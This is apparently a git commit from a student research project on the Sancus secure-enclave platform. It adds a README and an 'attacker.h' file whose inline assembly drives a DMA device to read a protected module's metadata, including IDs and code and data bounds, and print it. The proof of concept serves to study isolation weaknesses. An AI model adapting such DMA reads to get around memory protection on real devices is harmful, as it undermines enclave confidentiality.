2858cd1fb4666150e6534831b52fc92ce6f6f6f1
S3rg7o <seminara.sergio7@gmail.com>
2018-11-14 11:27:03 +0100

    attacker reading + attempt of trevis compilation

---
+++ sensor-reader-attack/README.md
@@ -0,0 +1,27 @@
+## Changelog (Sergio)
+
+The Makefile has been extended with the execution of "file_updater.sh", a bash script that copies the new Sancus files (DMA interface) into the installation folder on my local machine, so that it's possible to run the program on the new core. Very likely insuccess when it comes to Trevis compilation. 
+
+## Sensor-reader SMs: An end-to-end example
+
+This example program illustrates how to build and run a Sancus application. We
+follow the example given in the paper: one protected module providing readings
+from a memory-mapped I/O sensor, plus one that transforms this data and
+wraps (encrypts + signs) it to be sent to the vendor.
+
+The remote stakeholder is provided with an *authenticity* guarantee: a good
+signature over sensor readings associated with a fresh nonce can only be
+produced by untampered sensor/reader SMs. Moreover, the *confidentiality* of
+the transformed sensor readings is preserved.
+
+## Building and Running
+
+Complete instructions are available on the [Sancus
+website](https://distrinet.cs.kuleuven.be/software/sancus/examples.php). To
+build the program, simulate the resulting binary, and verify its output, simply
+run:
+
+```bash
+$ make clean sim
+```
+
---
+++ sensor-reader-attack/attacker.h
@@ -0,0 +1,103 @@
+#include <stdio.h>
+#include <sancus_support/sm_io.h>
+
+
+void attacker_read(struct SancusModule* address)
+{
+	uint16_t config_register;
+	uint16_t num_of_words = 7;
+	
+	uint16_t  sm_id = 0;
+	uint16_t  vendor_id =0;
+	uint16_t* name=0;
+	uint16_t* text_start = 0;
+	uint16_t* text_end = 0;
+	uint16_t* data_start = 0;
+	uint16_t* data_end = 0;
+	uint16_t* tmp_var = 0;
+	
+	uint16_t sm_struct_val[7];
+	int counter = 0;
+		
+	// Op-codes for the DMA device
+	const uint16_t WRITE_OP       = 0x0001;
+	const uint16_t END_WRITE      = 0x8000;
+	const uint16_t READ_OP        = 0x0005;
+	const uint16_t END_READ       = 0x8004;
+	const uint16_t READ_OP_ACK    = 0x001D;
+	const uint16_t WAIT_ACK_READ  = 0x200D;
+    const uint16_t END_READ_ACK   = 0xA00C;
+
+	
+
+	asm(" ; Define memory addresses  \n\t"
+		".equ START_ADDR_REG , 0x0100 \n\t"
+		".equ N_WORDS_REG    , 0x0102 \n\t"
+		".equ CONFIG_REG     , 0x0104 \n\t"	
+		".equ DATA_REG       , 0x0106 \n\t"
+		".equ OUT_REG        , 0x0108 \n\t"
+		".equ READ_OP        , 0x0005 \n\t"
+		".equ END_READ       , 0x8004 \n\t"
+		".equ WRITE_OP       , 0x0001 \n\t"
+		".equ END_WRITE      , 0x8000 \n\t"
+		".equ READ_OP_ACK    , 0x001D \n\t"
+		".equ WAIT_ACK_READ  , 0x200D \n\t"
+		".equ END_READ_ACK   , 0xA00C \n\t"
+		".equ CONFIG_REG     , 0x0104 \n\t"
+		" ; Start reading operation   \n\t"
+		" mov %1             , &START_ADDR_REG \n\t"
+		" mov %2             , &N_WORDS_REG    \n\t" 
+		" mov #READ_OP_ACK   , &CONFIG_REG     \n\t"
+		" mov &0x0104        , %0     \n\t"
+		: "=m"(config_register) //outputs
+		: "m"(address), //inputs
+		  "m"(num_of_words) );
+
+	while (config_register != END_READ_ACK) 
+	{
+		//wait until the end of operation and save the data
+		asm(" mov &DATA_REG , %1 \n\t"
+			" mov &0x0104   , %0" 
+			: "=m"(config_register), "=m"(sm_struct_val[counter]) /*outputs*/ );
+		if (config_register == WAIT_ACK_READ)
+		{
+			asm(" mov #READ_OP_ACK , &CONFIG_REG \n\t");
+		}		
+		counter=counter+1;	
+	}
+	
+	char stringa[11];
+	for(counter=0; counter<7; counter++)
+	{
+		switch (counter)
+		{
+			case 0:
+				stpcpy(stringa, "sm_id");
+				break;
+			case 1:
+				stpcpy(stringa, "vendor_id");
+				break;
+			case 2:
+				stpcpy(stringa ,"name");
+				break;
+			case 3:
+				stpcpy(stringa, "text_start");
+				break;
+			case 4:
+				stpcpy(stringa, "text_end");
+				break;
+			case 5:
+				stpcpy(stringa, "data_start");
+				break;
+			case 6:
+				stpcpy(stringa, "data_end");
+				break;
+		}
+		printf("[attacker] %s \t: 0x%.4x \n",stringa,sm_struct_val[counter]);
+	}  
+		  
+}
+
+
+
+       
